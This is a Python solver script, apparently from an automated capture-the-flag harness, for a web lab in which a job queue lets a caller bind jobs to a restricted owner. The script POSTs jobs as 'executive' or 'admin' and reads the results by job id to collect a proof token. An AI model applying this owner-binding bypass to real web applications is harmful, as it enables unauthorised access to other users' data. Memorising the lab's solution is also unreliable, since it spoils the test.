"""D30 "Queue the Confusion" (web-exploitation-day-29-queue-the-confusion): queue job owner binding bypass.

Kit shape: /api/clues = {framework, feature_route, secondary_route, owner_directory_route, current_role};
owner_directory_route -> {"caller": "analyst", "restricted_owner": "executive"};
GET feature -> 405 {"error":"post_required","request_fields":["owner"]}; POST JSON {"owner": <restricted>} ->
{"ok":true,"id":"13","queued_owner":"executive"}; GET secondary -> 400 {"error":"job_id_required","query_parameter":"id"};
secondary?id=<job id> -> {"ok":true,"effect":"queue_owner_binding_bypassed","evidence":"proof_..."}.
"""
import json
import urllib.parse

from lib import websolve

KEY_MAP = [(r"^owner_directory_route$", "day30_web_queue_the_confusion")]


def _get(base, path):
    st, body, _ = websolve.fetch(urllib.parse.urljoin(base, path))
    try:
        j = json.loads(body or "")
    except ValueError:
        j = {}
    return st, body, (j if isinstance(j, dict) else {})


def _owners(directory, role):
    out = []
    for k, v in directory.items():
        if k in ("caller", "current_role", "current_user"):
            continue
        vals = v if isinstance(v, list) else [v]
        for x in vals:
            if isinstance(x, dict):
                x = x.get("owner") or x.get("name") or x.get("id")
            if isinstance(x, str) and x and x != role:
                (out.insert(0, x) if "restrict" in k or "protect" in k else out.append(x))
    return list(dict.fromkeys(out))


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    feat, sec = cl.get("feature_route"), cl.get("secondary_route")
    if not isinstance(feat, str) or not isinstance(sec, str):
        return None
    role = cl.get("current_role", "analyst")
    _, _, d = _get(base, cl.get("owner_directory_route") or "/api/owners")
    role = d.get("caller", role)
    owners = _owners(d, role) or ["executive", "admin", "administrator"]
    _, _, fj = _get(base, feat)
    fields = [f for f in (fj.get("request_fields") or []) if isinstance(f, str)] or ["owner"]
    _, _, sj = _get(base, sec)
    qp = sj.get("query_parameter") if isinstance(sj.get("query_parameter"), str) else "id"
    for owner in owners[:3]:
        body = {f: owner for f in fields}
        st, txt, _ = websolve.fetch(urllib.parse.urljoin(base, feat), data=json.dumps(body).encode(),
                                    headers={"Content-Type": "application/json"}, timeout=8)
        p = websolve.proof(txt)
        if p:
            return p
        try:
            j = json.loads(txt or "")
        except ValueError:
            j = {}
        jid = None
        if isinstance(j, dict):
            for k in ("id", "job_id", "job", "jobId"):
                if j.get(k) not in (None, ""):
                    jid = j[k]
                    break
            if isinstance(jid, dict):
                jid = jid.get("id")
        if jid is None:
            continue
        url = urllib.parse.urljoin(base, sec) + ("&" if "?" in sec else "?") + urllib.parse.urlencode({qp: str(jid)})
        _, txt2, _ = websolve.fetch(url, timeout=8)
        p = websolve.proof(txt2)
        if p:
            return p
    return None


HANDLERS = {"day30_web_queue_the_confusion": exploit}
